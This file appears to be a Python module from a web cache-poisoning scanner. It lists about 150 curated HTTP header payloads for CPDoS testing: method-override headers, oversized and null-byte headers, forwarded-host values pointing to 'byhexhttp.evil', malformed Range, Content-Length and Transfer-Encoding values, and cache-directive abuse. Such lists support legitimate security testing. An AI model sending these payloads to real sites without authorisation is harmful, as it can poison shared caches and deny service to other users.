#!/usr/bin/python3

"""
Curated "top" CPDoS / Cache Poisoning payloads.

This is a hand-picked shortlist (~150) of the highest-signal header payloads
extracted from the full `sorted_payloads_errors` arsenal. It focuses on the
classic CPDoS vectors documented on https://cpdos.org/ and the header vectors
that historically trigger the most cache-poisoning / DoS behaviours:

    - HTTP Method Override (HMO)
    - HTTP Header Oversize (HHO)
    - HTTP Meta Character (HMC)
    - Forwarded-* host / scheme / port / proto rewriting
    - Range / Content-Range / Content-Length / Transfer-Encoding abuse
    - Accept-Encoding / Content-Type malformations
    - CDN / cache-control directive abuse

The goal is a fast first pass (a few seconds) that catches the common cases
before the exhaustive brute-force over the full list. It is also the list used
by the `--only-top` option, which skips the full brute-force entirely.
"""

_OVERSIZE = "A" * 8192
_HUGE = "A" * 65536

top_payloads_errors = [

    # --- HTTP Method Override (HMO) ---------------------------------------
    {"X-HTTP-Method-Override": "HEAD"},
    {"X-HTTP-Method-Override": "POST"},
    {"X-HTTP-Method-Override": "PUT"},
    {"X-HTTP-Method-Override": "DELETE"},
    {"X-HTTP-Method-Override": "PATCH"},
    {"X-HTTP-Method-Override": "OPTIONS"},
    {"X-HTTP-Method-Override": "TRACE"},
    {"X-HTTP-Method-Override": "INVALID"},
    {"X-HTTP-Method": "DELETE"},
    {"X-HTTP-Method": "HEAD"},
    {"X-Method-Override": "DELETE"},
    {"X-Method-Override": "HEAD"},

    # --- Forwarded host / scheme / port / proto ---------------------------
    {"X-Forwarded-Host": "byhexhttp.evil"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "byhexhttp.evil:1337"},
    {"X-Forwarded-Scheme": "http"},
    {"X-Forwarded-Scheme": "nothttps"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Proto": "invalid"},
    {"X-Forwarded-Port": "1337"},
    {"X-Forwarded-Port": "0"},
    {"X-Forwarded-Port": "-1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "255.255.255.255"},
    {"X-Forwarded-For": "notanip"},
    {"X-Forwarded-Server": "byhexhttp.evil"},
    {"X-Forwarded-Prefix": "/byhexhttp"},
    {"X-Host": "byhexhttp.evil"},
    {"X-Original-URL": "/byhexhttp"},
    {"X-Rewrite-URL": "/byhexhttp"},
    {"Forwarded": "host=byhexhttp.evil"},
    {"Forwarded": "for=127.0.0.1;host=localhost;proto=http"},
    {"Forwarded": "proto=http"},

    # --- HTTP Header Oversize (HHO) ---------------------------------------
    {"X-Oversized-Header": _OVERSIZE},
    {"X-Oversized-Header": _HUGE},
    {"Cookie": _OVERSIZE},
    {"Referer": _OVERSIZE},
    {"User-Agent": _OVERSIZE},
    {"Accept": _OVERSIZE},
    {"Accept-Language": _OVERSIZE},
    {"X-Forwarded-For": _OVERSIZE},

    # --- HTTP Meta Character (HMC) ----------------------------------------
    {"X-Metachar-Header": "\n"},
    {"X-Metachar-Header": "\r"},
    {"X-Metachar-Header": "\t"},
    {"X-Metachar-Header": "\x00"},
    {"X-Metachar-Header": "\x07"},
    {"X-Metachar-Header": "\x1b"},
    {"User-Agent": "byhexhttp\x00"},
    {"Accept": "text/html\x00"},
    {"Referer": "https://byhexhttp\x00"},

    # --- Range / partial content ------------------------------------------
    {"Range": "bytes=0-"},
    {"Range": "bytes=-1"},
    {"Range": "bytes=0-0"},
    {"Range": "bytes=0-18446744073709551615"},
    {"Range": "bytes=cf=si"},
    {"Range": "bytes=0-,-1"},
    {"Range": "bytes=" + "0-1," * 2000},
    {"Range": "bytes=99999999999999-"},
    {"Range": "bytez=0-100"},
    {"Content-Range": "bytes 0-0/*"},
    {"Content-Range": "bytes */*"},
    {"Content-Range": "bytes 100-0/100"},

    # --- Content-Length / Transfer-Encoding -------------------------------
    {"Content-Length": "0"},
    {"Content-Length": "-1"},
    {"Content-Length": "999999999"},
    {"Content-Length": "notanumber"},
    {"Transfer-Encoding": "chunked"},
    {"Transfer-Encoding": "identity"},
    {"Transfer-Encoding": "gzip, chunked"},
    {"Transfer-Encoding": "invalid"},
    {"Transfer-Encoding": " chunked"},
    {"Transfer-Encoding": "chunked, chunked"},

    # --- Accept-Encoding / content negotiation ----------------------------
    {"Accept-Encoding": "gzip;q=0,deflate;q=0,br;q=0"},
    {"Accept-Encoding": "invalid-encoding"},
    {"Accept-Encoding": "identity;q=0"},
    {"Accept-Encoding": "*;q=0"},
    {"Accept-Encoding": "br, gzip, deflate, invalid"},
    {"A-IM": "feed"},
    {"A-IM": "invalid-im"},
    {"IM": "vcdiff"},
    {"TE": "trailers, deflate;q=0.5"},

    # --- Content-Type malformations ---------------------------------------
    {"Content-Type": "invalid/type"},
    {"Content-Type": "application/json; charset=invalid"},
    {"Content-Type": "text/html; charset=\x00"},
    {"Content-Type": "multipart/form-data"},
    {"Content-Type": "application/x-www-form-urlencoded; boundary=x"},
    {"Content-Type": ""},
    {"Content-Type": "text/html" + ";" * 500},

    # --- CDN / cache-control directive abuse ------------------------------
    {"Cache-Control": "no-store"},
    {"Cache-Control": "max-age=99999999"},
    {"Cache-Control": "no-cache, no-store, must-revalidate"},
    {"Cache-Control": "invalid-directive"},
    {"CDN-Cache-Control": "no-cache"},
    {"CDN-Cache-Control": "max-age=0"},
    {"Surrogate-Control": "no-store"},
    {"Surrogate-Control": "max-age=0"},
    {"Pragma": "no-cache"},
    {"Vary": "*"},
    {"Vary": "X-Byhexhttp"},

    # --- Host header oddities ---------------------------------------------
    {"Host": "localhost"},
    {"Host": "127.0.0.1"},
    {"Host": "byhexhttp.evil"},
    {"Host": _OVERSIZE},

    # --- Common proxy / cache backend leaks -------------------------------
    {"X-Cache": "MISS"},
    {"X-Cache-Key": "/byhexhttp"},
    {"X-Backend": "byhexhttp"},
    {"X-Backend-Server": "byhexhttp"},
    {"X-Accel-Redirect": "/byhexhttp"},
    {"X-Squid-Error": "ERR_ACCESS_DENIED 0"},
    {"X-Timer": "S0.000000"},
    {"Surrogate-Capability": "cache=\"Surrogate/1.0\""},
    {"Fastly-FF": "byhexhttp"},
    {"X-Amz-Website-Redirect-Location": "/byhexhttp"},

    # --- Connection / hop-by-hop ------------------------------------------
    {"Connection": "close"},
    {"Connection": "keep-alive"},
    {"Connection": "X-Byhexhttp"},
    {"Connection": "Cache-Control"},
    {"Keep-Alive": "timeout=1000000"},
    {"Upgrade": "h2c"},
    {"Upgrade": "websocket"},

    # --- Misc high-signal headers -----------------------------------------
    {"Max-Forwards": "0"},
    {"Max-Forwards": "-1"},
    {"Expect": "100-continue"},
    {"Expect": "invalid"},
    {"If-Modified-Since": "invalid-date"},
    {"If-Unmodified-Since": "0"},
    {"If-Range": "invalid"},
    {"Priority": "u=0, i"},
    {"Priority": "invalid"},
    {"Origin": "https://byhexhttp.evil"},
    {"Origin": "null"},
    {"Accept-Charset": "invalid-charset"},
    {"Accept-Charset": "utf-8, *;q=0"},
    {"Content-Encoding": "gzip"},
    {"Content-Encoding": "invalid"},
    {"Content-MD5": "invalid-md5"},
    {"Content-Disposition": "attachment; filename=\x00"},
    {"NEL": "{invalid-json}"},
    {"Reporting-Endpoints": "invalid"},
    {"Sec-CH-UA": "invalid"},
    {"Via": "1.1 byhexhttp"},
    {"Warning": "199 byhexhttp \"test\""},
]
